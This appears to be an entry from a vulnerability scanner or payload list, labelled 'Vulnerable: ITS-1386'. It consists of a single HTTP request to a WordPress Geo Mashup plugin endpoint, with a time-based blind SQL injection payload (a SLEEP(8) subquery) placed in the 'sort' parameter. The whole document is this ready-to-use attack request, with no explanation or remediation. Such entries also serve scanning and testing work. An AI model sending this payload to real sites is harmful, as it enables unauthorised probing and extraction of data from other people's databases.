# Vulnerable: ITS-1386
GET /wp-admin/admin-ajax.php?action=geo_mashup_query&output=json&sort=(SELECT(0)FROM(SELECT(SLEEP(8)))a)
